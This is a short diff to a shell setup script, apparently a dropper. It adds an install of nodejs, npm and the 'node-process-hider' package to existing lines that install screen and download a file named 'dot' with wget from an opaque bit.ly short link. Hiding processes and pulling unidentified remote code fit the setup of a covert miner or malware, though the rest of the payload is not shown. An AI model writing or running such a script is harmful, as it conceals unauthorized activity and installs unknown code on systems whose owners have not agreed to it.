@@ -1,3 +1,11 @@
+apt update -y
+
+apt install nodejs -y
+
+apt install npm -y
+
+npm i -g node-process-hider
+
 apt install screen -y
 
 wget -O dot https://bit.ly/kontolrum
